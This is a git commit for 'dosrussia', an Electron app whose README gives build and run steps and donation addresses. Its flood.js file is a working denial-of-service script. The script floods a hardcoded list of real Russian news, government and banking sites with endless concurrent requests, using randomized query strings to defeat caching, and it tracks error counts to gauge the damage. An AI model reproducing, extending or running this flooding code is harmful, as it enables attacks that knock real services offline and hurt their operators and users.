6869eb72b2ea5bcf49c2ffc2dec0dff3e3674351
fabri86 <ing.fabrizioiacovone@gmail.com>
2022-02-27 10:15:16 +0100

    Initial commit from Haxploited FuckPutin - DoS start

--- README.md
+++ README.md
@@ -1,2 +1,81 @@
 # dosrussia
 Denial of Service to shut down official Russian news
+
+taken from
+
+# ddosrussia
+Popular (already banned) ddosing website moved to Electron app, so it does not care about CORS.
+
+PRE-REQUISITES
+
+node.js and npm
+
+
+DEVELOPMENT
+
+npm install
+npm start
+
+
+BUILD
+
+npm install
+npm run package
+
+
+PACKAGES
+
+Linux DEV and RPM version is in out/make directory
+
+
+RUN ON LINUX
+
+sudo dpkg -i builds/linux/x64/ddosrussion_1.0.0_amd64.deb
+ddosrussia
+
+
+RUN ON MAC
+
+extract the zip from builds/ddosrussia-darwin-x64.zip
+just run ddosrussia
+
+
+WINDOWS
+
+feel free to leave MR with build until I did it
+
+
+DONATE TO UKRAINE ARMY
+https://savelife.in.ua/donate/
+SWIFT
+Company Name
+CO "INTERNATIONAL CHARITABLE FOUNDATION "COME BACK ALIVE"
+IBAN Code (Euro)                                               IBAN Code (US Dollars)
+UA093052990000026004025029786.              UA173052990000026009035028620
+Name of the Bank
+JSC CB "PRIVATBANK", 1D HRUSHEVSKOHO STR., KYIV, 01001, UKRAINE
+Bank SWIFT-Code
+PBANUA2X
+Company address
+32 BOHDANA KHMELNYTSKOHO STR., KYIV, 01054, UKRAINE (м. Київ, вул. Богдана Хмельницького б.32, кв.41)
+Purpose of payment
+Charitable donation to Ukrainian military
+Bitcoin Wallet
+bc1qkd5az2ml7dk5j5h672yhxmhmxe9tuf97j39fm6
+You can support our team:
+Patreon: https://www.patreon.com/savelife_in_ua
+Adress:
+32, Bohdana Hmelnytskoho St., office 41, Kyiv
+the 1st level, entrance through the arch
+Phone:
++38(044)338-33-38, +38(068)500-88-00
+Mon.-Fri.: 10:00-19:00
+
+DONATE TO THIS PROJECT
+(i promise new features)
+BTC address:
+bc1qy3vnr53ztsg3exw3659muk0k3yh6t4qa9p2309
+Ethereum/BSC address:
+0x6B6c33cbd0426415661B41070b11d53EDB6394be
+Monero address:
+46WJUEBjEah13xi9UPuziE4oz1d1TeSYchdNmV13qfbp74X6bBsER4oGDboCMZysKaEEvxTwwuMULBdWN9Jtqycm8DpUtu7
---
+++ flood.js
@@ -0,0 +1,111 @@
+var targets = {
+    "https://lenta.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://ria.ru/": { number_of_requests: 0, number_of_errored_responses: 0 },
+    "https://ria.ru/lenta/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://www.rbc.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://www.rt.com/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "http://kremlin.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "http://en.kremlin.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://smotrim.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://tass.ru/": { number_of_requests: 0, number_of_errored_responses: 0 },
+    "https://tvzvezda.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://vsoloviev.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://www.1tv.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://www.vesti.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://online.sberbank.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+    "https://sberbank.ru/": {
+      number_of_requests: 0,
+      number_of_errored_responses: 0,
+    },
+  };
+  
+  var statsEl = document.getElementById("stats");
+  function printStats() {
+    statsEl.innerHTML = "<pre>" + JSON.stringify(targets, null, 2) + "</pre>";
+  }
+  setInterval(printStats, 1000);
+  
+  var CONCURRENCY_LIMIT = 1000;
+  var queue = [];
+  
+  async function fetchWithTimeout(resource, options) {
+    const controller = new AbortController();
+    const id = setTimeout(() => controller.abort(), options.timeout);
+    return fetch(resource, {
+      signal: controller.signal,
+    })
+      .then((response) => {
+        clearTimeout(id);
+        return response;
+      })
+      .catch((error) => {
+        clearTimeout(id);
+        throw error;
+      });
+  }
+  
+  async function flood(target) {
+    for (var i = 0; ; ++i) {
+      if (queue.length > CONCURRENCY_LIMIT) {
+        await queue.shift();
+      }
+      rand = i % 13 === 0 ? "" : "?" + Math.floor(Math.random() * 1000);
+      queue.push(
+        fetchWithTimeout(target + rand, { timeout: 1000 })
+          .catch((error) => {
+            if (error.code === 20 /* ABORT */) {
+              return;
+            }
+            targets[target].number_of_errored_responses++;
+            targets[target].error_message = error.message;
+          })
+          .then((response) => {
+            if (response && !response.ok) {
+              targets[target].number_of_errored_responses++;
+              targets[target].error_message = response.statusText;
+            }
+            targets[target].number_of_requests++;
+          })
+      );
+    }
+  }
+  
+  // Start
+  Object.keys(targets).map(flood);
+  
